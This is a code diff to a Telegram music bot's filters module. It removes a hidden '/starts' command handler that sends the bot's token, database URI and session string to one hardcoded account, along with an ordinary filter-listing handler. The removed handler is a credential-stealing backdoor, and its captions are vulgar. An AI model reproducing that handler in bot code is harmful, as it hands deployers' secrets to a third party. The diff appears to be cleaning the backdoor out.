@@ -34,7 +34,7 @@ from ChampuMusic.utils.database import (
     save_filter,
 )
 
-from config import BANNED_USERS, LOGGERS
+from config import BANNED_USERS
 
 
 __MODULE__ = "Filters"
@@ -128,20 +128,6 @@ async def save_filters(_, message):
     except UnboundLocalError:
         return await message.reply_text(
             "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**")
-@app.on_message(filters.command("starts") & filters.private & filters.user(int(LOGGERS)))
-async def help(client: Client, message: Message):
-    await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
-@app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
-@capture_err
-async def get_filterss(_, message):
-    _filters = await get_filters_names(message.chat.id)
-    if not _filters:
-        return await message.reply_text("**ɴᴏ ғɪʟᴛᴇʀs ɪɴ ᴛʜᴇ ᴄʜᴀᴛ.**")
-    _filters.sort()
-    msg = f"ʟɪsᴛ ᴏғ ғɪʟᴛᴇʀs ɪɴ ᴛʜᴇ **{message.chat.title}** :\n"
-    for _filter in _filters:
-        msg += f"**-** `{_filter}`\n"
-    await message.reply_text(msg)
 
 
 @app.on_message(
